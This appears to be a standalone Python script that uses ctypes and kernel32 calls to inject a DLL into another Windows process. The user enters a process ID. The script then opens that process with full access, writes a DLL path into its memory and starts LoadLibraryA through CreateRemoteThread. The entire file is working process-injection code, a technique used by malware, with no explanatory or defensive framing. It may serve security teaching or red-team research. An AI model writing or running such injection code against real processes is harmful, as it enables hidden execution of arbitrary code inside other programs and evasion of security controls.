from ctypes import *
from ctypes.wintypes import *

# Constants
SIZE_T = c_size_t
LPTHREAD_START_ROUTINE = LPVOID
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0xFFF)
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
VIRTUAL_MEM = (MEM_RESERVE | MEM_COMMIT)
PAGE_READWRITE = 0x04
EXECUTE_IMMEDIATELY = 0x0
INFINITE = 0xFFFFFFFF
MEM_RELEASE = 0x8000

class SECURITY_ATTRIBUTES(Structure):
    _fields_ = [('nLength', DWORD),
                ('lpSecurityDescriptor', LPVOID),
                ('bInheritHandle', BOOL)]

LPSECURITY_ATTRIBUTES = POINTER(SECURITY_ATTRIBUTES)

# Define argtypes and restype for needed functions
kernel32 = WinDLL('kernel32', use_last_error=True)

kernel32.OpenProcess.argtypes = [DWORD, BOOL, DWORD]
kernel32.OpenProcess.restype = HANDLE

kernel32.VirtualAllocEx.argtypes = [HANDLE, LPVOID, SIZE_T, DWORD, DWORD]
kernel32.VirtualAllocEx.restype = LPVOID

kernel32.WriteProcessMemory.argtypes = [HANDLE, LPVOID, LPCVOID, SIZE_T, POINTER(SIZE_T)]
kernel32.WriteProcessMemory.restype = BOOL

kernel32.GetModuleHandleA.argtypes = [c_char_p]
kernel32.GetModuleHandleA.restype = HANDLE

kernel32.GetProcAddress.argtypes = [HANDLE, c_char_p]
kernel32.GetProcAddress.restype = LPVOID

kernel32.CreateRemoteThread.argtypes = [HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD]
kernel32.CreateRemoteThread.restype = HANDLE

kernel32.VirtualFreeEx.argtypes = [HANDLE, LPVOID, SIZE_T, DWORD]
kernel32.VirtualFreeEx.restype = BOOL

# Update the DLL path  
dll_path = b"C:\\YOUR-PATH\\remote_dll_injection.dll"

# Prompt for the PID
pid = int(input("Enter the target process ID (PID): "))

# OpenProcess
process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
if not process_handle:
    raise WinError()

print(f"Process Handle: {process_handle}")

# Allocate memory in the remote process
remote_memory_address = kernel32.VirtualAllocEx(process_handle, None, len(dll_path) + 1, VIRTUAL_MEM, PAGE_READWRITE)
if not remote_memory_address:
    raise WinError()

print(f"Remote Memory Allocated at: 0x{remote_memory_address:X}")

# Write the DLL location into the remote process memory
bytes_written = c_size_t()
success = kernel32.WriteProcessMemory(process_handle, remote_memory_address, dll_path, len(dll_path) + 1, byref(bytes_written))
if not success:
    raise WinError()

print(f"Bytes Written: {bytes_written.value}")

# Get address of LoadLibraryA in kernel32.dll
load_library_addr = kernel32.GetProcAddress(kernel32.GetModuleHandleA(b"kernel32.dll"), b"LoadLibraryA")
if not load_library_addr:
    raise WinError()

print(f"LoadLibraryA Address: 0x{load_library_addr:X}")

# Create a remote thread to load the DLL
thread_id = DWORD()
thread_handle = kernel32.CreateRemoteThread(process_handle, None, 0, load_library_addr, remote_memory_address, EXECUTE_IMMEDIATELY, byref(thread_id))
if not thread_handle:
    raise WinError()

print(f"Remote Thread Created with ID: {thread_id.value}")

# Wait for the remote thread to finish
kernel32.WaitForSingleObject(thread_handle, INFINITE)

# Clean up
kernel32.VirtualFreeEx(process_handle, remote_memory_address, 0, MEM_RELEASE)
kernel32.CloseHandle(process_handle)